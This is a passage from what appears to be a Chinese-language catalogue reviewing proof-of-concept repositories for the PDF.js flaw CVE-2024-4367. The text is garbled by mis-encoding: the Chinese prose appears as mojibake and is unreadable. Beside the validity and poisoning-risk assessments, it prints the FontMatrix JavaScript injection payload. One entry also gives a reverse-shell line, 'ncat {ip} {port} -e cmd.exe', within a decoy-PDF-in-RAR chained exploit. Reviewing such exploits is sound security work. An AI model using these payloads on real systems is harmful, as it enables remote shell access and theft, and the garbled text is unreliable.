**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

